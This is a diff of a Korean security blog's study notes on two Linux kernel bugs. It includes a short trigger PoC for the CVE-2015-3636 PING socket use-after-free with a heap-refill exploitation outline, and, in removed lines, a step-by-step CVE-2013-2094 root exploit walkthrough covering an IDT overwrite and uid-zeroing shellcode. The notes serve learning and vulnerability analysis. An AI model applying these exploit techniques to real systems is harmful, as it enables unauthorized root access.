+<li>일단 0x200200 을 mapping 해놔서 paging fault 를 막아낸 다음에,</li>
+<li><code>sock_put()</code> 을 두번 불러서 <code>sk_free()</code> 가 불려지도록 하고,</li>
+<li>그 다음에 거기를 어떻게든 re-fill 해놓고</li>
+<li>close() 콜로 close 관련 function ptr 을 호출하는</li>
+<li>Use-after-refill-after-free 상황을 만들어내는게 저자의 의도같다.</li>
+</ul>
+
+
+<p>Use-after-free 를 설명하면,</p>
+
+<ul>
+<li>일단 free 를 시켜야한다. allocator 가 잡고 있는 메모리에 뭘 쓰는건 어렵다.</li>
+<li>근데 비정상적으로 free 시키는 것이 좋다. 정상적으로 free 시키면 진짜 없는 녀석이 되기 때문에, 나중에 사용이 불가능하다.</li>
+<li>비정상적으로 free 시키고, 그 자리에 어떻게든 다른 object 를 allocate 시켜야한다.</li>
+<li>다른 object 를 allocate 시킨 다음에, 그 내용을 어느정도 조작할 수 있어야한다.</li>
+<li>원래 object 의 function ptr 가 위치했던 자리를 조작해낼 수 있으면 대박이다.</li>
+<li>조작해낸 다음에 원래 object 의 close() 를 부르면 close function ptr 가 호출되고&hellip; 이러면 대박이다.</li>
+</ul>
+
+
+<p>저자들은 여기서 refilling 이 핵심이라고 이야기한다.</p>
+
+<h4>PoC</h4>
+
+<p>CVE-2015-3636 의 PoC.</p>
+
+<figure class='code'><figcaption><span>PoC of CVE-2015-3636</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="n">IPPROTO_ICMP</span><span class="p">);</span>
+</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">sa_family</span> <span class="o">=</span> <span class="n">AF_INET</span> <span class="p">};</span>
+</span><span class='line'><span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
+</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr</span> <span class="n">_addr</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">sa_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span> <span class="p">};</span>
+</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">_addr</span><span class="p">));</span>
+</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">_addr</span><span class="p">));</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이렇게 하면 crash 가 날것 같은데.</p>
+
+<ul>
+<li>처음에는 AF_INET 으로 해야한다고 한다.</li>
+<li>Android 디바이스에서만 동작한다고 한다. <code>/proc/sys/net/ipv4/ping_group_range</code> 에 PING socket 을 만들 수 있는 그룹이 정의되어 있다고. PC 리눅스와 Android 와는 이 부분이 다르다고.</li>
+</ul>
+
+
+<p>QEMU 에 android kernel 을 올려서, 저 코드를 실행을 해봐야겠다.</p>
+
+<h4>Exploitation</h4>
+
+<p>Kernel 에서 SLAB/SLUB allocator 를 사용한다고 하는데.</p>
+
+<p>고려해야할 점은.</p>
+
+<ul>
+<li>Isolated Heap. PartitionAlloc. 이런 메커니즘들.</li>
+<li>Privileged Access Never.</li>
+<li>Linux kernel 의 multi-threading support.</li>
+</ul>
+
+
+<p>둘간의 차이는 여기에 <a href="http://events.linuxfoundation.org/images/stories/pdf/klf2012_kim.pdf">SLAB vs SLUB</a></p>
+
+<p>이 쯤에서 저자들이 이 버그를 어떻게 찾아냈는지 추측해본다.</p>
+
+<ul>
+<li>Trinity 로 android kernel call fuzzing 을 심하게 걸었는데</li>
+<li>0x200200 에 write 가 들어가면서 paging fault 가 나는 것을 보고 조사를 해보니,</li>
+<li>PING socket 에 대한 connect 가 두번 불려서 일어난 것이라는 걸 알아내고</li>
+<li>아니, 시스템 콜 이중호출로 paging fault 가 일어나는 걸 보니, 수상한걸&hellip;</li>
+<li>아니, 이중호출로 object 가 free() 가 되네.</li>
+<li>이거 use-after-free 아녀?</li>
+<li>free() 한 다음에 refill 이 가능할까?</li>
+</ul>
+
+
+<p>뭐 이렇게 흘러간것 같다.</p>
+
+<ul>
+<li>socket structure 를 삐꾸로 free() 하고,</li>
+<li>memory allocator 를 어찌어찌 이용해서, 그 자리에 뭔가 object 를 alloc 시켜서 refill 을 한 다음에,</li>
+<li>(socket 이 정상이라고 착각하고 있는 상황에서) socket close() 를 불러서, close_func_ptr 이 호출되게 만드는데,</li>
+<li>그 포인터는 exploit 을 향하고 있다.</li>
+</ul>
+
+
+<p>이 정도가 아닐까?</p>
+
+<h4>Refill</h4>
+
+<p>저자들은 refill 이 가장 어려웠다고 한다.</p>
+
+<ul>
+<li><code>sendmmsg()</code> 를 가지고 refill 을 한 모양.</li>
+<li><code>sendmmsg()</code> 수행중에 <code>kmalloc</code> 이 들어가서 파라메터로 넘겨준 데이터 패킷을 저장하기 위한 버퍼를 alloc 한다고.</li>
+<li>데이터패킷의 사이즈를 지정할 수 있는데, 512 로 해서, PING socket 과 같은 cache 에 alloc 되도록 한다.</li>
+</ul>
+
+
+<p>즉 흐름을 정리하면 <code>(512 bytes) PING SOCK</code> -> bug free -> <code>(512 bytes) FREE chunk</code> -> sendmmsg -> <code>(512 bytes) TRANSFER BUFFER</code> 가 되는 셈.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -622,1372 +1904,6 @@
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/07/19/how-dot-slash-sms-could-bypass-authy-2-factor-authentication/">How ../sms Could Bypass Authy 2 Factor Authentication</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-07-19T13:17:49+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>19</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:17 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://sakurity.com/blog/2015/03/15/authy_bypass.html">How &ldquo;../sms&rdquo; could bypass Authy 2 Factor Authentication</a></p>
-
-<p>Sakurity 블로그의 글 또 하나.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/07/18/cve-2013-2094-kernel-perf-swevent-enabled-array-out-of-bound-access/">CVE-2013-2094 Kernel: Perf_swevent_enabled Array Out-of-bound Access</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-07-18T19:41:53+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:41 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><ul>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=962792#c16">CVE-2013-2094 kernel: perf_swevent_enabled array out-of-bound access</a></li>
-<li><a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/">A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)</a></li>
-<li><a href="https://github.com/realtalk/cve-2013-2094">github</a></li>
-<li><a href="https://dl.packetstormsecurity.net/1403-exploits/perf_swevent_init.c">Brad Spengler</a></li>
-<li><a href="http://phrack.org/issues/64/6.html#article">Phrack #64 file 6, Attacking the Core : Kernel Exploiting Notes</a></li>
-<li><a href="http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html">Intel: Interrupt and Exception Overview</a></li>
-</ul>
-
-
-<h4>C basics</h4>
-
-<p><code>-1</code> 로 indexing 이 되는 상황이 여기있다. <code>uint32</code> -> <code>int32</code> -> <code>int64</code> 로 거치면서 negative indexing 이 되는 상황.</p>
-
-<figure class='code'><figcaption><span>increment</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">main</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="n">a</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span> <span class="p">};</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">config</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int32_t</span> <span class="n">index</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int64_t</span> <span class="n">index64</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">index</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">index64</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">b</span><span class="p">[</span><span class="n">index64</span><span class="p">]]);</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&amp;b: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&amp; : %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">[</span><span class="n">index64</span><span class="p">]);</span>
-</span><span class='line'>    <span class="c1">//atomic_inc(&amp;b[index64]);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">atomic_inc</span>
-</span><span class='line'><span class="mi">0</span>
-</span><span class='line'><span class="o">&amp;</span><span class="nl">b</span><span class="p">:</span> <span class="mh">0x7fff4f7407b4</span>
-</span><span class='line'><span class="o">&amp;</span> <span class="o">:</span> <span class="mh">0x7fff4f7407b0</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>원래 <code>&amp;b[0]</code> 이 kernel address 였으면 -1 indexing 정도는 마찬가지로 kernel address 가 된다. base - 4 * abs(index) 에 위치한 값이 increment 된다. kernel memory 를 increment 할 수 있는 primitive 를 가지게 된 셈이다.</p>
-
-<figure class='code'><figcaption><span>decrement</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">main</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">config</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">uint64_t</span> <span class="n">uindex64</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int64_t</span> <span class="n">index64</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">uindex64</span> <span class="o">=</span> <span class="n">config</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;uindex64: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">uindex64</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">index64</span> <span class="o">=</span> <span class="n">uindex64</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="mh">0xffFFffFF81f360c0</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&amp;b: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&amp; : %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b</span><span class="p">[</span><span class="n">index64</span><span class="p">]);</span>
-</span><span class='line'>    <span class="c1">//atomic_dec(&amp;b[index64]);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">atomic_dec</span>
-</span><span class='line'><span class="nl">uindex64</span><span class="p">:</span> <span class="mh">0xffffffff</span>
-</span><span class='line'><span class="o">&amp;</span><span class="nl">b</span><span class="p">:</span> <span class="mh">0xffffffff81f360c0</span>
-</span><span class='line'><span class="o">&amp;</span> <span class="o">:</span> <span class="mh">0x381f360bc</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>kernel memory 였던 <code>0xffffffff81f360c0</code> 이 <code>+ 0xffffffff</code> overflow 해서 user-land 인 <code>0x381f360bc</code> 로 넘어가버렸다. <code>0x381f360bc</code> 를 알면 원래 <code>b</code> 를 알 수 있을까? 있다.</p>
-
-<figure class='code'><figcaption><span>calc_orginal_base.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdint.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;linux/perf_event.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;syscall.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">main</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0xffFFffFF81f360c0</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="mh">0x381f360bc</span><span class="p">;</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">o</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">o</span> <span class="o">=</span> <span class="n">p</span> <span class="o">-</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0xffFFffFF</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">o</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">calc_original_base</span>
-</span><span class='line'><span class="mh">0xffffffff81f360c0</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>즉,</p>
-
-<ol>
-<li>user-land 에 메모리를 잡아놓고,</li>
-<li>그 메모리를 0 으로 초기화한다음에,</li>
-<li>atomic_dec() 를 <code>config == -1</code> 로 트리거한다음에,</li>
-<li>메모리를 스캔해서 0 에서 바뀐 메모리 offset 을 알아내고,</li>
-<li>그 메모리에서 0xffFFffFF 를 빼면 perf_swevent_enabled 의 주소를 얻게 되는 것이다.</li>
-<li>이 주소를 기반으로 <code>asm sidt</code> 에서 얻은 IDT 주소를 인풋으로 계산해서, vulnerable 한 perf_swevent_init() 을 트리거시키는 것이다. perf_swevent_open() 을 통해서.</li>
-<li>그러면 IDT 의 vector offset 주소의 상위 4 바이트 0xffFFffFF 가 atomic_inc() 되면서, 0x0 이 되고, interrupt 를 처리하는 vector 주소가 커널에서 user-land 로 바뀌게 된다.</li>
-<li>그 주소에는 이미 NOP slide + shell code 가 들어가있어서,</li>
-<li>인터럽트를 발생시키면 kernel priv. 로 shell code 가 수행된다.</li>
-<li>shell code 는 current task 의 credential structure 를 찾아서, uid/gid 를 0 으로 바꾸고, int 0x4 관련 Interrupt descriptor 를 원복하는 일을 한다.</li>
-<li>이제 <code>asm("int $0x4");</code> 로 인터럽트 수행. shell code 가 ring0 priv. 로 돈다.</li>
-<li>정리하면 -1 에 대해서, destroy path 에서 user-land 메모리를 dec() 하고, 같은 -1 에 대해서, init/open path 에서 kernel 메모리를 inc() 한다.</li>
-</ol>
-
-
-<p>어쨌건 kernel memory 일부 영역을 increment 할 수 있는 primitive 를 얻게 되었다.</p>
-
-<p><code>0xffffffff........</code> 인 어드레스의 top 32-bits 에 inc() 를 걸면 0 으로 변한다. 커널주소를 user-land 주소로 바꾸는 primitive 를 얻은 셈이다.</p>
-
-<h4>signed/unsigned</h4>
-
-<p><code>perf_swevent_init</code> 는 <code>kernel/events/core.c</code> 에 defined.</p>
-
-<figure class='code'><figcaption><span>calc_orginal_base.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="n">init</span> <span class="nf">perf_swevent_init</span><span class="p">(</span><span class="k">struct</span> <span class="n">perf_event</span> <span class="o">*</span><span class="n">event</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="kt">int</span> <span class="n">event_id</span> <span class="o">=</span> <span class="n">event</span><span class="o">-&gt;</span><span class="n">attr</span><span class="p">.</span><span class="n">config</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">event</span><span class="o">-&gt;</span><span class="n">attr</span><span class="p">.</span><span class="n">type</span> <span class="o">!=</span> <span class="n">PERF_TYPE_SOFTWARE</span><span class="p">)</span>
-</span><span class='line'>        <span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="p">...</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">event_id</span> <span class="o">&gt;=</span> <span class="n">PERF_COUNT_SW_MAX</span><span class="p">)</span>
-</span><span class='line'>        <span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="p">...</span>
-</span><span class='line'>    <span class="n">static_key_slow_inc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">event_id</span><span class="p">]);</span>
-</span><span class='line'>    <span class="p">...</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>event_id 는 <code>int event_id = event-&gt;attr.config</code> 로 <code>signed</code> 변수.</p>
-
-<p><code>event-&gt;attr.config</code> 의 31st bit 이 세팅이되면 event_id 는 negative value 가 된다.</p>
-
-<p>negative value 가 되면 <code>if (event_id &gt;= PERF_COUNT_SW_MAX)</code> 를 통과하게 된다.</p>
-
-<p>통과하면 <code>static_key_slow_inc(&amp;perf_swevent_enabled[event_id])</code> 에 들어가는데.</p>
-
-<p>static_key_slow_int() 는 <code>kernel/jump_label.c</code> 에 등록되어있다.</p>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">static_key_slow_inc</span><span class="p">(</span><span class="k">struct</span> <span class="n">static_key</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">atomic_inc_not_zero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">enabled</span><span class="p">))</span>
-</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="n">jump_label_lock</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">enabled</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>        <span class="p">...</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'>    <span class="n">atomic_inc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">enabled</span><span class="p">);</span>
-</span><span class='line'>    <span class="n">jump_label_unlock</span><span class="p">();</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>그리고 <code>perf_swevent_enabled</code> 는</p>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">static_key</span> <span class="p">{</span>
-</span><span class='line'>    <span class="kt">atomic_t</span> <span class="n">enabled</span><span class="p">;</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="n">jump_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">;</span>
-</span><span class='line'><span class="cp">#ifdef CONFIG_MODULES</span>
-</span><span class='line'>    <span class="k">struct</span> <span class="n">static_key_mod</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
-</span><span class='line'><span class="cp">#endif</span>
-</span><span class='line'><span class="p">};</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">struct</span> <span class="n">static_key</span> <span class="n">perf_swevent_enabled</span><span class="p">[</span><span class="n">PEF_COUNT_SW_MAX</span><span class="p">]</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>즉 <code>atomic_t</code> 에 대한 <code>atomic_inc()</code> 가 들어가는 상황. 근데 index 가 negative 면, 엉뚱한 메모리에 대해서 atomic_inc() 가 들어갈 수 있음.</p>
-
-<p>근데, 설명을 보면 <code>atomic_t perf_swevent_enabled[PERF_COUNT_SW_MAX]</code> 라고 되어있음. 커널 버전에 따라 다른가 의심됨.</p>
-
-<p>하여간 설명이 맞다고 하면, <code>perf_swevent_enabled[]</code> 는 integer array 이고. negative indexing 이 되는 상황을 가정해보면.</p>
-
-<p><code>event_id</code> 가 64-bit 로 sign extended 되고. <code>event_id</code> 가 -1 라고 하면,</p>
-
-<p><code>0xffffffff</code> -> <code>0xffffffffffffffff</code> 가 된다.</p>
-
-<p>인덱싱되는 어드레스는 <code>event_id * sizeof(int)</code> + &amp;perf_swevent_enabled 가 된다.</p>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">boot</span><span class="o">/</span><span class="n">System</span><span class="p">.</span><span class="n">map</span><span class="o">-</span><span class="mf">2.6.32</span><span class="o">-</span><span class="mf">358.</span><span class="n">el6</span><span class="p">.</span><span class="n">x86_64</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">perf_swevent_enabled</span>
-</span><span class='line'><span class="n">ffffffff81f360c0</span> <span class="n">B</span> <span class="n">perf_swevent_enabled</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>하면 <code>perf_swevent_enabled</code> 의 주소가 나오는데.</p>
-
-<p><code>event-&gt;attr.config == 0xffffffff</code> 라고 하면,</p>
-
-<p><code>0xffFFffFFffFFffFF * 4 + 0xffffffff81f360c0 == 0xffFFffFF81f360bc</code></p>
-
-<p>이 되고.</p>
-
-<p><code>event-&gt;attr.config == 0xfffffffe</code> 라고 하면,</p>
-
-<p><code>0xffFFffFFffFFffFe * 4 + 0xffffffff81f360c0 == 0xffFFffFF81f360b8</code></p>
-
-<p>이 된다.</p>
-
-<p>커널 메모리를 inc 하게 되는 셈인데.</p>
-
-<p>이제 <code>sw_perf_event_destroy()</code> 를 보면.</p>
-
-<p><code>u64 event_id = event-&gt;attr.config;</code> 로 되어있다.</p>
-
-<p>이 코드는 destroy 쪽 code path 이다. perf_swevent_open() 으로 만들어진 fd 가 close() 될 때, 수행되는 코드이다.</p>
-
-<figure class='code'><figcaption><span>static_key_slow_inc()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
